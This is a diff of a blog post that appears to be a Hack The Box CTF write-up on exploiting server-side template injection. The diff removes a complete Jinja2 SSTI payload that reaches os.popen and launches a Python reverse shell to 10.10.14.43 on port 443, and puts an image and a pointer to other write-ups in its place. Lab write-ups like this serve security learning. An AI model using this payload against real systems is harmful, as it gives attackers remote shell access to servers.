@@ -148,9 +148,8 @@ This part of the typical HTB challenge is always difficult because a lot of the 
 
 Normally, the process of exploiting SSTI to get code execution involves enumerating for a module that will give you that ability, and then inserting your payload. Luckily, the field we're exploiting allows us to input as much text as we want, so we can use the following payload that I picked up from 0xdf's blog a while ago.
 
-```python
-{\% for x in ().__class__.__base__.__subclasses__() \%}{\% if "warning" in x.__name__ \%}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.43\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{\%endif\%}{\% endfor \%}
-```
+![oof](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121151437.png)
+<sub>The engine I use to render the markdown for the blog didn't like the syntax, but the payload is on 0xdf's Doctor writeup, and I think PayloadsAllTheThings as well</sub>
 
 This will iterate over every possible module and check if we can get execution. If we can, we run the reverse shell payload. If we run this against the target, we get a shell back on our listener.
 
